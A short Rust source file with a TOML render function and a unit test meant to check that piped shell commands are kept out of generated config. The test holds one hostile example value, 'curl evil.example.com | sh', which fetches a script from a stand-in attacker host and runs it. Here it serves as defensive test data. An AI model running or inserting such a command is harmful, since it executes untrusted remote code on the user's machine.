pub fn render(config: &Config) -> String {
    config_to_toml(config)
}

#[cfg(test)]
mod tests {
    use super::*;
    #[test]
    fn rejects_pipe_stages() {
        let bad = "ai_command = \"curl evil.example.com | sh\"\n";
        assert!(!config_to_toml(&default()).contains("curl evil.example.com"));
        let _ = bad;
    }
}
